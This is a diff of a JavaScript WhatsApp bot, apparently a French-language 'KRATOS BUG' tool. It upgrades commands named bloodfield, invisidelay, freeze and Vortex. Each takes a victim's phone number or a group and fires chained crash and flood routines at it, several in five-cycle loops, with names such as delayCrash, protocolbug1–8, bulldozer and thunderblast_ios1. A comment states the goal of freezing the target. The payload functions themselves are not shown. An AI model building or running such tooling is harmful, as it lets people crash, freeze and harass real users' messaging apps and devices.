@@ -1318,41 +1318,94 @@ const purge = {
 // === Bloodfield ===
 const bloodfield = {
   name: "bloodfield",
-  execute: async (sock, msg, args, from) => {
+  execute: async (sock, msg, args, from, _, prefix, command) => {
     const q = args[0];
     if (!q) {
-      return sock.sendMessage(from, { text: `📌 Exemple : !bloodfield 237xxxxxxxx` }, { quoted: msg });
+      return sock.sendMessage(
+        from,
+        { text: `📌 Exemple : ${prefix + command} 237xxxxxxxx` },
+        { quoted: msg }
+      );
     }
 
     let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-    await sock.sendMessage(from, {
-      image: { url: "https://files.catbox.moe/c11niu.jpeg" },
-      caption: `⚡ *BLOODFIELD ACTIVÉ !*\n\n🎯 Cible : wa.me/${q.replace(/[^0-9]/g, "")}\n🛡️ Module : *KRATOS BUG Bloodfield*`
-    }, { quoted: msg });
+    // Intro
+    await sock.sendMessage(
+      from,
+      {
+        image: { url: "https://files.catbox.moe/c11niu.jpeg" },
+        caption: `💀 *BLOODFIELD ACTIVÉ !*\n\n🎯 Cible : wa.me/${q.replace(
+          /[^0-9]/g,
+          ""
+        )}\n🛡️ Module : *KRATOS BUG Bloodfield MAX POWER*`,
+      },
+      { quoted: msg }
+    );
 
     await sleep(2000);
 
     try {
-      await apaya(sock, target);
-      await sleep(500);
+      for (let i = 0; i < 5; i++) { // 🔁 5 cycles complets
+        // Thunderblast iOS x3
+        await thunderblast_ios1(sock, target);
+        await sleep(300);
+        await thunderblast_ios1(sock, target);
+        await sleep(300);
+        await thunderblast_ios1(sock, target);
+        await sleep(500);
 
-      await alldelay(sock, target);
-      await sleep(1000);
+        // Apaya
+        await apaya(sock, target);
+        await sleep(500);
 
-      await bulldozer(sock, target);
-      await sleep(500);
+        // Bulldozer
+        await bulldozer(sock, target);
+        await sleep(500);
 
-      await allProtocol(sock, target);
-      await sleep(1000);
+        // Carousels
+        await carousels2(sock, target);
+        await sleep(500);
+        await CarouselX(sock, target);
+        await sleep(1000);
 
-      await bulldozer(sock, target);
+        // Delay Family
+        await alldelay(sock, target);
+        await sleep(500);
+        await superdelayinvid(sock, target);
+        await sleep(500);
+        await delayCrash(sock, [target], false);
+        await sleep(500);
+        await KingDelayMess(sock, target);
+        await sleep(500);
+        await KingBroadcast(sock, target);
+        await sleep(1000);
 
-      await sock.sendMessage(from, { react: { text: "💀", key: msg.key } });
+        // Protocol Bugs
+        await protocolbug1(sock, target, true);
+        await sleep(300);
+        await protocolbug2(sock, target, true);
+        await sleep(300);
+        await protocolbug3(sock, target, true);
+        await sleep(300);
+        await protocolbug6(sock, target, true);
+        await sleep(300);
+        await protocolbug7(sock, target, true);
+        await sleep(300);
+        await protocolbug8(sock, target, true);
+        await sleep(1000);
+      }
+
+      // Fin
+      await sock.sendMessage(
+        from,
+        { text: `✅ *BLOODFIELD MAX terminé sur ${q}*` },
+        { quoted: msg }
+      );
     } catch (err) {
       console.error("❌ Erreur dans bloodfield:", err);
     }
-  }
+  },
 };
 // === KratosX ===
 const kratosx = {
@@ -1430,10 +1483,10 @@ const invisidelay = {
       from,
       {
         image: { url: "https://files.catbox.moe/c11niu.jpeg" },
-        caption: `⚡ *INVISI DELAY ACTIVÉ...*\n\n🎯 Cible : wa.me/${q.replace(
+        caption: `⚡ *INVISI DELAY ULTRA ACTIVÉ...*\n\n🎯 Cible : wa.me/${q.replace(
           /[^0-9]/g,
           ""
-        )}\n🛡️ Module : *Invisi Delay Power*`,
+        )}\n🛡️ Module : *Invisi Delay MAX Power*`,
       },
       { quoted: msg }
     );
@@ -1441,28 +1494,55 @@ const invisidelay = {
     await sleep(2000);
 
     try {
+      // === Tous les DELAY ===
       await alldelay(sock, target);
+      await sleep(500);
+
+      await superdelayinvid(sock, target);
+      await sleep(500);
+
+      await delayCrash(sock, [target], false);
+      await sleep(500);
+
+      await KingDelayMess(sock, target);
+      await sleep(500);
+
+      await KingBroadcast(sock, target);
       await sleep(1000);
 
-      await alldelay(sock, target);
+      // === Tous les PROTOCOL BUGS (1 à 8) ===
+      await protocolbug1(sock, target, true);
+      await sleep(500);
+
+      await protocolbug2(sock, target, true);
+      await sleep(500);
+
+      await protocolbug3(sock, target, true);
+      await sleep(500);
+
+      await protocolbug6(sock, target, true);
+      await sleep(500);
+
+      await protocolbug7(sock, target, true);
+      await sleep(500);
+
+      await protocolbug8(sock, target, true);
+      await sleep(500);
+
+      // Bulldozer en renfort
       await bulldozer(sock, target);
       await sleep(1000);
 
-      await protocolbug8(sock, target);
-      await sleep(1000);
-
+      // Reprise d’un cycle de DELAY pour bien geler
       await alldelay(sock, target);
-      await sleep(1000);
-
-      await alldelay(sock, target);
-      await alldelay(sock, target);
-      await sleep(1000);
-
-      await alldelay(sock, target);
+      await sleep(500);
+      await superdelayinvid(sock, target);
+      await sleep(500);
+      await delayCrash(sock, [target], false);
 
       await sock.sendMessage(
         from,
-        { text: `✅ *INVISI DELAY terminé sur ${q}*` },
+        { text: `✅ *INVISI DELAY ULTRA terminé sur ${q}*` },
         { quoted: msg }
       );
     } catch (err) {
@@ -1485,14 +1565,15 @@ const freeze = {
 
     let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
+    // Intro
     await sock.sendMessage(
       from,
       {
         image: { url: "https://files.catbox.moe/c11niu.jpeg" },
-        caption: `⚡ *Traitement Android en cours...*\n\n🎯 Cible : wa.me/${q.replace(
+        caption: `⚡ *FREEZE MODE ACTIVÉ !*\n\n🎯 Cible : wa.me/${q.replace(
           /[^0-9]/g,
           ""
-        )}\n🧩 Module : *KRATOS BUG V4 Android*`,
+        )}\n🛡️ Module : *KRATOS BUG FULL POWER*`,
       },
       { quoted: msg }
     );
@@ -1500,36 +1581,73 @@ const freeze = {
     await sleep(2000);
 
     try {
-      await thunderblast_ios1(sock, target);
-      await sleep(1000);
-
-      await apaya(sock, target);
-      await sleep(1000);
-
+      // === THUNDERBLAST ===
       await thunderblast_ios1(sock, target);
       await sleep(500);
 
-      await alldelay(sock, target);
-      await sleep(1000);
+      // === APAYA ===
+      await apaya(sock, target);
+      await sleep(500);
 
+      // === BULLDOZER ===
       await bulldozer(sock, target);
+      await sleep(500);
+
+      // === CAROUSELS ===
+      await carousels2(sock, target);
+      await sleep(500);
+
+      await CarouselX(sock, target);
       await sleep(1000);
 
-      await allProtocol(sock, target);
+      // === DELAY FAMILY ===
+      await alldelay(sock, target);
+      await sleep(500);
+
+      await superdelayinvid(sock, target);
+      await sleep(500);
+
+      await delayCrash(sock, [target], false);
+      await sleep(500);
+
+      await KingDelayMess(sock, target);
+      await sleep(500);
+
+      await KingBroadcast(sock, target);
       await sleep(1000);
 
+      // === PROTOCOL BUGS 1 → 8 ===
+      await protocolbug1(sock, target, true);
+      await sleep(500);
+
+      await protocolbug2(sock, target, true);
+      await sleep(500);
+
+      await protocolbug3(sock, target, true);
+      await sleep(500);
+
+      await protocolbug6(sock, target, true);
+      await sleep(500);
+
+      await protocolbug7(sock, target, true);
+      await sleep(500);
+
+      await protocolbug8(sock, target, true);
+      await sleep(1000);
+
+      // === REDO CYCLE THUNDERBLAST ===
       await thunderblast_ios1(sock, target);
-      await sleep(1000);
-
+      await sleep(500);
       await thunderblast_ios1(sock, target);
 
+      // Fin
       await sock.sendMessage(
         from,
         { text: `✅ *FREEZE terminé sur ${q}*` },
         { quoted: msg }
       );
     } catch (err) {
-      console.log("⚠️ Erreur pendant l'exécution de freeze :", err);
+      console.error("❌ Erreur dans freeze:", err);
     }
   },
 };
@@ -1552,7 +1670,7 @@ const Vortex = {
       from,
       {
         image: { url: "https://files.catbox.moe/c11niu.jpeg" },
-        caption: `⚡ *VORTEX ACTIVÉ !*\n\n🎯 Cible : *Ce Groupe*\n🛡️ Module : *KRATOS BUG Vortex*`,
+        caption: `⚡ *VORTEX SURCHARGÉ ACTIVÉ !*\n\n🎯 Cible : *Ce Groupe*\n🛡️ Module : *KRATOS BUG Vortex X*`,
       },
       { quoted: msg }
     );
@@ -1560,32 +1678,40 @@ const Vortex = {
     await sleep(1500);
 
     try {
-      await thunderblast_ios1(sock, target);
-      await sleep(500);
+      // 🔥 On répète plusieurs vagues
+      for (let i = 0; i < 5; i++) {
+        console.log(`⚡ Vortex - vague ${i + 1}`);
 
-      await apaya(sock, target);
-      await sleep(500);
+        // Mélange de bugs lourds
+        await thunderblast_ios1(sock, target);
+        await sleep(500);
 
-      await thunderblast_ios1(sock, target);
-      await sleep(1000);
+        await apaya(sock, target);
+        await sleep(500);
 
-      await thunderblast_ios1(sock, target);
-      await sleep(500);
+        await alldelay(sock, target, 3, 500); // mini delay flood
+        await sleep(800);
 
-      await apaya(sock, target);
-      await sleep(500);
+        await bulldozer(sock, target);
+        await sleep(500);
 
-      await thunderblast_ios1(sock, target);
-      await sleep(1000);
+        await allProtocol(sock, target, 3); // mini proto flood
+        await sleep(1000);
 
-      await thunderblast_ios1(sock, target);
-      await sleep(500);
+        if (i % 2 === 0) {
+          await carousels2(sock, target);
+        } else {
+          await CarouselX(sock, target);
+        }
 
-      await thunderblast_ios1(sock, target);
+        await sleep(1200);
+      }
 
-      await sock.sendMessage(from, { react: { text: "⚡", key: msg.key } });
+      await sock.sendMessage(from, { react: { text: "💥", key: msg.key } });
+      await sock.sendMessage(from, { text: "✅ *VORTEX terminé avec puissance X5 !*" }, { quoted: msg });
+
     } catch (err) {
-      console.error("Erreur dans vortex:", err);
+      console.error("❌ Erreur dans vortex:", err);
     }
   },
 };
